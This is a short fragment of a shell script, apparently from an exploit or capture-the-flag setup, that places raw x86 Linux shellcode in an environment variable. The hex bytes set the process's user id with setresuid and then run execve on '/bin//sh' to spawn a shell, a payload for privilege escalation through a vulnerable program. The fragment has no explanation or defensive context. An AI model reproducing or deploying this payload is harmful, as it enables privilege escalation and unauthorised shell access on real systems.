...
if [ "$SC" == "" ]; then
export SC=$'\x31\xc0\xb0\xa4\x31\xdb\xb3\x42\xc1\xe3\x08\xb3\x69\x89\xd9\x89\xda\xcd\x80\x31\xc0\xb0\x0b\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'
fi
export PWD=`pwd`
